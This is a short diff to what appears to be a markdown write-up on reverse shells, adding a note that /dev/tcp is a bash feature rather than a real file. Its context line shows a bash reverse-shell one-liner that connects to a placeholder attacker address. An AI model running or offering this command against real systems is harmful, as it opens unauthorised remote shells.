@@ -64,6 +64,8 @@ bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1
 
 Now we're living off the land and have zero dependencies! (outside of network egress)
 
+> ! Note: /dev/{tcp,udp} is not a real file, it's a bash feature (non-POSIX). Other shells may not support this.
+
 ---
 
 # Concerns
